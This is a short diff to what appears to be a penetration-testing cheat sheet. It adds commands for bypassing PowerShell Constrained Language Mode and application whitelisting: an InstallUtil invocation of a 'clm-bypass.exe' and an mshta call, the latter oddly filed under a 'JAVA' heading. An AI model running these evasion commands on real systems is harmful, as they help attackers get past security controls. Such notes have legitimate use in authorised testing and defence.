@@ -234,6 +234,15 @@ $ExecutionContext.SessionState.LanguageMode
 Installutil.exe /logfile= /LogToConsole=false /U "C:\temp\bypass-clm.exe"
 ```
 
+```powershell
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /logtoconsole=false /U C:\path\to\clm-bypass.exe
+```
+
+##### JAVA
+```powershell
+mshta file.hta
+```
+
 ##### App Locker
 
 ```powershell
